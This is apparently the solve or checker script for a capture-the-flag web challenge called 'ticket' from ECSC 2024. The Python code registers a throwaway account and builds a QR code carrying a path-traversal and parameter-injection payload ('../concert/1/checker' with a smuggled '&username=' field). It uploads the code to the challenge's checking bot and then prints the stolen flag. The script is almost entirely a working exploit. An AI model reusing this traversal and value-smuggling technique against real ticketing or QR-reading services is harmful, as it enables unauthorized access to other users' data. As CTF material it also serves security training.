#!/usr/bin/env python3

import logging
import os
import random
import string
import requests
import qrcode
import time

def make_qr_code(content):
    FILENAME = "qr.pjpg"
    image = qrcode.make(content)
    image.save(FILENAME, format='JPEG')
    return FILENAME

def random_string():
    return ''.join(random.choices(string.ascii_letters, k=8))

logging.disable()

CHALL_URL = os.environ.get("URL", "https://ticket.challs.jeopardy.ecsc2024.it")
if CHALL_URL.endswith("/"):
    CHALL_URL = CHALL_URL[:-1]

BOT_URL = os.environ.get("BOT_URL", "https://ticket-bot.challs.jeopardy.ecsc2024.it")

def check():
    # Register
    s = requests.Session()
    username = random_string()
    password = random_string()

    r = s.post(f"{CHALL_URL}/api/v1/register/", data={
        "username": username,
        "password": password,
        "password_confirm": password
    }, verify=False)

    assert r.status_code == 201

    # Login
    r = s.post(f"{CHALL_URL}/api/v1/login/", data={
        "username": username,
        "password": password
    }, verify=False)

    assert r.status_code == 201

    status_token = r.json()["session_token"]

    # Report
    qr_code_img_name = make_qr_code(f"serial=../concert/1/checker&comment=%26username={username}")
    r = requests.post(f"{BOT_URL}/upload/", files={"qrImage": open(qr_code_img_name, 'rb')}, verify=False)

    assert "Ticket correctly checked" in r.text
    time.sleep(1)

    os.unlink(qr_code_img_name)

    # Get flag
    r = s.get(f"{CHALL_URL}/api/v1/user/concert/", headers={"Authorization": status_token}, verify=False)
    assert r.status_code == 200

    r = r.json()
    concert = r[0]
    flag = concert["secret_code"]

    print(flag)

if __name__ == "__main__":
    check()
